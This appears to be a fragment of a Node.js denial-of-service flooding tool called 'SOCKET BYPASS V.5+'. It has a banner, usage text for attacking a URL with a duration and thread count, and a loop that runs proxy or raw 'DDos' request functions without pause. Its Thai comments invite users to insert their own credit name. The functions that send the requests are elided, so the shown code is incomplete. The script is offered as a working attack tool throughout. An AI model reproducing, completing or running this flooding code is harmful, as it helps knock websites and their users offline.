...
╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩   ╚═╝ ╩ ╩  ╩ ╩╚═╝╚═╝
                     SOCKET BYPASS V.5+
Usage: ./socket <URL> <Time> <auto/off> <Threads>
  Example: ./socket <https://example.com> <60> <auto> <5>

            [ > CODE By: credit < ]
`),
    process.exit(0);
    /* credit ให้กรอกชื่อที่เราต้องการได้เลย
    ที่เหลือศึกษาเอาเองเลย */
} else {
    console.log("FLOOD SOCKET V.5"),
    console.log("[ > CODE By: credit< ]"),
    main();
}

async function main() {

    console.log("credit DDos Work...")
    ...
    function runable() {
        ...
        function startloop() {
            if (mode == "auto" || mode == "AUTO" || mode == "Auto"){
                console.log("DDos Proxy Mode")
                setInterval(() => {
                    send_req_proxy();
                });
            } else {
                console.log("DDos Raw Mode")
                setInterval(() => {
                    send_req_raw();
                });
            }
